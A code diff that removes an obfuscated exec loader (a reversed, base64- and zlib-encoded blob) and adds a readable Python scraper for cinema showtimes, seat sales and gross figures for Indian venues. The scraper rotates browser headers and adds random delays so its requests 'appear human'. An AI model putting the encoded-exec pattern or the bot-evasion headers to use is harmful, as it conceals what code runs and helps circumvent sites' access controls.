@@ -1,2 +1,462 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+import json
+import os
+import asyncio
+import aiohttp
+import random
+from datetime import datetime, timedelta
+import pytz
+
+# =====================================================
+# CONFIG
+# =====================================================
+SHARD_ID = 9
+CONCURRENCY = 10          # Reduced to accommodate delays
+TIMEOUT = aiohttp.ClientTimeout(total=30)
+
+IST = pytz.timezone("Asia/Kolkata")
+NOW_IST = datetime.now(IST)
+
+DATE_CODE = os.environ["DATE_CODE"]
+DATE_DISTRICT = datetime.strptime(DATE_CODE, "%Y%m%d").strftime("%Y-%m-%d")
+
+BASE_DIR = os.path.join("advance", "data", DATE_CODE)
+LOG_DIR = os.path.join(BASE_DIR, "logs")
+os.makedirs(LOG_DIR, exist_ok=True)
+
+DETAILED_FILE = f"{BASE_DIR}/detailed{SHARD_ID}.json"
+SUMMARY_FILE  = f"{BASE_DIR}/movie_summary{SHARD_ID}.json"
+LOG_FILE      = f"{LOG_DIR}/district{SHARD_ID}.log"
+
+API_URL = "https://distr.textil.workers.dev/?cinema_id={cid}&date={date}"
+
+# =====================================================
+# ROTATING HEADERS POOLS
+# =====================================================
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+]
+
+ACCEPT_LANGUAGES = [
+    "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+    "en-US,en;q=0.9,hi;q=0.8",
+    "en-GB,en;q=0.9,en-US;q=0.8",
+    "en;q=0.9,en-IN;q=0.8,hi;q=0.7",
+]
+
+# Optional – randomise the Sec-Ch-Ua values as well
+SEC_CH_UA_OPTIONS = [
+    '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+    '"Google Chrome";v="151", "Chromium";v="151", "Not?A_Brand";v="99"',
+    '"Microsoft Edge";v="151", "Chromium";v="151", "Not=A?Brand";v="99"',
+]
+
+# =====================================================
+# LOGGING
+# =====================================================
+def log(msg):
+    ts = datetime.now(IST).strftime("%H:%M:%S")
+    line = f"[{ts}] {msg}"
+    print(line, flush=True)
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(line + "\n")
+
+# =====================================================
+# LOAD DISTRICT VENUES
+# =====================================================
+with open("districtvenues.json", "r", encoding="utf-8") as f:
+    DIST_VENUES = json.load(f)
+
+log(f"📍 Loaded {len(DIST_VENUES)} district venues")
+
+# =====================================================
+# HELPERS
+# =====================================================
+def format_state(s):
+    if not s:
+        return "Unknown"
+    parts = s.replace("-", " ").split()
+    formatted = []
+    for word in parts:
+        if word.isupper():
+            formatted.append(word)
+        else:
+            formatted.append(word.capitalize())
+    return " ".join(formatted)
+
+def format_chain(s):
+    if not s:
+        return "Unknown"
+    return " ".join(w.capitalize() for w in s.replace("-", " ").split())
+
+def dedupe(rows):
+    seen = set()
+    out = []
+    for r in rows:
+        key = (
+            r.get("venue", ""),
+            r.get("time", ""),
+            r.get("session_id", ""),
+            r.get("audi", ""),
+        )
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append(r)
+    return out
+
+# =====================================================
+# FETCH SINGLE VENUE (self IP, rotating headers, delays)
+# =====================================================
+async def fetch_one(session, venue):
+    cid = venue.get("id")
+    url = API_URL.format(cid=cid, date=DATE_DISTRICT)
+
+    # Random delay before each request to spread load and appear human
+    delay = random.uniform(1.5, 4.0)
+    await asyncio.sleep(delay)
+
+    # Load required secrets
+    WORKER_UA = os.environ.get("WORKER_UA")
+    WORKER_KEY = os.environ.get("WORKER_KEY")
+    if not WORKER_UA or not WORKER_KEY:
+        log(f"❌ Missing WORKER_UA / WORKER_KEY for {cid}")
+        return None
+
+    # Build rotating headers
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS),
+        "x-api-key": WORKER_KEY,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache",
+        "Sec-Ch-Ua": random.choice(SEC_CH_UA_OPTIONS),
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Upgrade-Insecure-Requests": "1",
+    }
+
+    try:
+        # No proxy – use self IP
+        async with session.get(url, headers=headers) as resp:
+            if resp.status != 200:
+                log(f"⚠ {cid} status {resp.status}")
+                return None
+
+            data = await resp.json()
+
+            # Debug checks
+            dbg = data.get("_debug", {})
+            authorized = dbg.get("authorized", None)
+            poisoned = data.get("_poisoned", False)
+
+            if authorized is True:
+                log(f"✅ {cid} → AUTH OK")
+            elif authorized is False:
+                log(f"❌ {cid} → POISONED")
+            else:
+                log(f"⚠ {cid} → NO DEBUG")
+
+            if poisoned:
+                log(f"💀 {cid} → DATA CORRUPTED")
+
+            if "_warning" in data:
+                log(f"⚠ {cid} warning: {data['_warning']}")
+
+            # Date filter
+            session_dates = data.get("data", {}).get("sessionDates", [])
+            if DATE_DISTRICT not in session_dates:
+                return None
+
+            return {"venue": venue, "data": data}
+
+    except Exception as e:
+        log(f"❌ {cid} {type(e).__name__}: {str(e)}")
+        return None
+
+# =====================================================
+# FETCH ALL (ASYNC)
+# =====================================================
+async def fetch_all():
+    sem = asyncio.Semaphore(CONCURRENCY)
+    results = []
+
+    async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
+        async def bound(v):
+            async with sem:
+                return await fetch_one(session, v)
+
+        tasks = [bound(v) for v in DIST_VENUES]
+        raw = await asyncio.gather(*tasks, return_exceptions=True)
+
+    for r in raw:
+        if isinstance(r, Exception):
+            log(f"❌ Task exception: {r}")
+            continue
+        if r:
+            results.append(r)
+
+    log(f"✅ Fetched {len(results)} venues with shows")
+    return results
+
+# =====================================================
+# PARSE DATA
+# =====================================================
+def parse(results):
+    detailed = []
+
+    for res in results:
+        venue_meta = res["venue"]
+        data = res["data"]
+
+        city = venue_meta.get("city") or "Unknown"
+        state = format_state(venue_meta.get("state"))
+
+        cinema = data.get("meta", {}).get("cinema", {})
+
+        venue_name = (
+            cinema.get("name")
+            or venue_meta.get("name")
+            or venue_meta.get("district_name")
+            or "Unknown"
+        )
+
+        venue_addr = (
+            cinema.get("address")
+            or venue_meta.get("address")
+            or ""
+        )
+
+        chain = format_chain(
+            venue_meta.get("chainKey")
+            or venue_meta.get("chain")
+            or venue_name
+        )
+
+        movies = data.get("meta", {}).get("movies", []) or []
+        movie_map = {}
+        for m in movies:
+            movie_map[m.get("id")] = m
+            movie_map[str(m.get("id"))] = m
+
+        for s in data.get("pageData", {}).get("sessions", []) or []:
+            mid = s.get("mid")
+            movie = movie_map.get(mid) or movie_map.get(str(mid))
+            if not movie:
+                continue
+
+            name = movie.get("name", "Unknown")
+            lang = s.get("lang") or movie.get("lang") or ""
+            fmt = s.get("scrnFmt") or ""
+            fmt = fmt.replace("-", " | ") if fmt else ""
+
+            movie_key = (
+                f"{name} [{fmt} | {lang}]"
+                if fmt else f"{name} | {lang}"
+            )
+
+            total = int(s.get("total", 0))
+            avail = int(s.get("avail", 0))
+            sold = total - avail
+
+            gross = sum(
+                (a.get("sTotal", 0) - a.get("sAvail", 0)) * a.get("price", 0)
+                for a in s.get("areas", []) or []
+            )
+
+            occ = (sold / total * 100) if total else 0
+
+            detailed.append({
+                "movie": movie_key,
+                "city": city,
+                "state": state,
+                "venue": venue_name,
+                "address": venue_addr,
+                "time": (
+                    datetime.strptime(s.get("showTime"), "%Y-%m-%dT%H:%M")
+                    .replace(tzinfo=pytz.UTC)
+                    .astimezone(IST)
+                    .strftime("%I:%M %p")
+                    if s.get("showTime") else ""
+                ),
+                "audi": s.get("audi", ""),
+                "session_id": str(s.get("id", "")),
+                "totalSeats": total,
+                "available": avail,
+                "sold": sold,
+                "gross": round(gross, 2),
+                "occupancy": f"{round(occ, 2)}%",
+                "source": "District",
+                "date": DATE_CODE,
+                "chain": chain
+            })
+
+    return dedupe(detailed)
+
+# =====================================================
+# BUILD SUMMARY
+# =====================================================
+def build_summary(detailed):
+    summary = {}
+
+    for r in detailed:
+        movie = r["movie"]
+        city = r["city"]
+        state = r["state"]
+        venue = r["venue"]
+        chain = r["chain"]
+
+        total = r["totalSeats"]
+        sold = r["sold"]
+        gross = r["gross"]
+        occ = (sold / total * 100) if total else 0
+
+        if movie not in summary:
+            summary[movie] = {
+                "shows": 0,
+                "gross": 0.0,
+                "sold": 0,
+                "totalSeats": 0,
+                "venues": set(),
+                "cities": set(),
+                "fastfilling": 0,
+                "housefull": 0,
+                "details": {},
+                "Chain_details": {}
+            }
+
+        m = summary[movie]
+        m["shows"] += 1
+        m["gross"] += gross
+        m["sold"] += sold
+        m["totalSeats"] += total
+        m["venues"].add(venue)
+        m["cities"].add(city)
+
+        if occ >= 98:
+            m["housefull"] += 1
+        elif occ >= 50:
+            m["fastfilling"] += 1
+
+        ck = (city, state)
+        if ck not in m["details"]:
+            m["details"][ck] = {
+                "city": city,
+                "state": state,
+                "venues": set(),
+                "shows": 0,
+                "gross": 0.0,
+                "sold": 0,
+                "totalSeats": 0,
+                "fastfilling": 0,
+                "housefull": 0
+            }
+
+        d = m["details"][ck]
+        d["venues"].add(venue)
+        d["shows"] += 1
+        d["gross"] += gross
+        d["sold"] += sold
+        d["totalSeats"] += total
+        if occ >= 98:
+            d["housefull"] += 1
+        elif occ >= 50:
+            d["fastfilling"] += 1
+
+        if chain not in m["Chain_details"]:
+            m["Chain_details"][chain] = {
+                "chain": chain,
+                "venues": set(),
+                "shows": 0,
+                "gross": 0.0,
+                "sold": 0,
+                "totalSeats": 0,
+                "fastfilling": 0,
+                "housefull": 0
+            }
+
+        c = m["Chain_details"][chain]
+        c["venues"].add(venue)
+        c["shows"] += 1
+        c["gross"] += gross
+        c["sold"] += sold
+        c["totalSeats"] += total
+        if occ >= 98:
+            c["housefull"] += 1
+        elif occ >= 50:
+            c["fastfilling"] += 1
+
+    final = {}
+    for movie, m in summary.items():
+        final[movie] = {
+            "shows": m["shows"],
+            "gross": round(m["gross"], 2),
+            "sold": m["sold"],
+            "totalSeats": m["totalSeats"],
+            "venues": len(m["venues"]),
+            "cities": len(m["cities"]),
+            "fastfilling": m["fastfilling"],
+            "housefull": m["housefull"],
+            "occupancy": round((m["sold"] / m["totalSeats"]) * 100, 2) if m["totalSeats"] else 0.0,
+            "details": [],
+            "Chain_details": []
+        }
+
+        for d in m["details"].values():
+            final[movie]["details"].append({
+                "city": d["city"],
+                "state": d["state"],
+                "venues": len(d["venues"]),
+                "shows": d["shows"],
+                "gross": round(d["gross"], 2),
+                "sold": d["sold"],
+                "totalSeats": d["totalSeats"],
+                "fastfilling": d["fastfilling"],
+                "housefull": d["housefull"],
+                "occupancy": round((d["sold"] / d["totalSeats"]) * 100, 2) if d["totalSeats"] else 0.0
+            })
+
+        for c in m["Chain_details"].values():
+            final[movie]["Chain_details"].append({
+                "chain": c["chain"],
+                "venues": len(c["venues"]),
+                "shows": c["shows"],
+                "gross": round(c["gross"], 2),
+                "sold": c["sold"],
+                "totalSeats": c["totalSeats"],
+                "fastfilling": c["fastfilling"],
+                "housefull": c["housefull"],
+                "occupancy": round((c["sold"] / c["totalSeats"]) * 100, 2) if c["totalSeats"] else 0.0
+            })
+
+    return final
+
+# =====================================================
+# ENTRY
+# =====================================================
+async def main():
+    log("🚀 DISTRICT SCRAPER STARTED (self IP, rotating headers, delays)")
+    results = await fetch_all()
+    detailed = parse(results)
+    summary = build_summary(detailed)
+
+    with open(DETAILED_FILE, "w", encoding="utf-8") as f:
+        json.dump(detailed, f, indent=2, ensure_ascii=False)
+
+    with open(SUMMARY_FILE, "w", encoding="utf-8") as f:
+        json.dump(summary, f, indent=2, ensure_ascii=False)
+
+    log(f"✅ DONE | Shows={len(detailed)} | Movies={len(summary)}")
+
+if __name__ == "__main__":
+    asyncio.run(main())
